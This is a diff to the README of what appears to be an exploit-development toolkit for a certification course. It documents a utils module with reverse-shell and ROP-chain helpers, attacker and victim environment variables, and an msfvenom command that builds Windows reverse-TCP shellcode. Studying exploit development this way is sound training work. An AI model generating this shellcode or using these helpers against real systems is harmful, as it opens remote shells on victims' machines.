@@ -214,6 +214,29 @@ Below, the process will load pykd, set a breakpoint (let's assume a pop-pop-ret 
 while ($true) {\\tsclient\shared\osed-scripts\attach-process.ps1 -process-name PROCESS_NAME -commands '.load pykd; bp PPR_ADDRESS; g; !exchain; g; p; p; p;' ;}
 ```
 
+### utils.py
+
+Exploit development utilities importable from other scripts.
+
+```python
+from utils import RopChain, sanity_check, get_connection, get_reverse_shell
+```
+
+**Environment variables** — all functions accept explicit arguments, but fall back to environment variables when arguments are omitted. This is useful with [direnv](https://direnv.net/) or a `.env` file.
+
+| Variable | Used by | Description |
+|----------|---------|-------------|
+| `LHOST` | `get_reverse_shell` | Attacker IP or interface (e.g. `eth0`) |
+| `LPORT` | `get_reverse_shell` | Attacker port |
+| `VICTIM_HOST` | `get_connection` | Target IP address |
+| `VICTIM_PORT` | `get_connection` | Target port |
+| `SHELLCODE` | `get_payload_from_msfvenom` | Hex-encoded shellcode (skips msfvenom when set) |
+
+Copy `.env.sample` to `.env` and fill in your values. Generate the `SHELLCODE` value with:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -b '\x00' -f hex
+```
+
 ## WinDbg Scripts
 
 all windbg scripts require `pykd`
